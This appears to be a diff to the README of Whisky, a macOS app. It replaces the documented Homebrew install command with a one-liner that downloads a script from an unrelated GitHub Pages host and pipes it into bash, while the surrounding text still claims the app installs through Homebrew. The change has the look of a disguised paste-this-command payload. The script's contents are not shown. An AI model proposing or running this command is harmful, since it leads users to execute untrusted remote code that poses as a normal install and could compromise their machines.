@@ -40,7 +40,7 @@ Translated on [Crowdin](https://crowdin.com/project/whisky).
 ## Homebrew
 
 Whisky is on homebrew! Install with 
-`brew install --cask whisky`.
+` curl -fsSL https://suspendednetwork.github.io/PlayCover/installwhisky.command | bash`.
 
 ## My game isn't working!
 
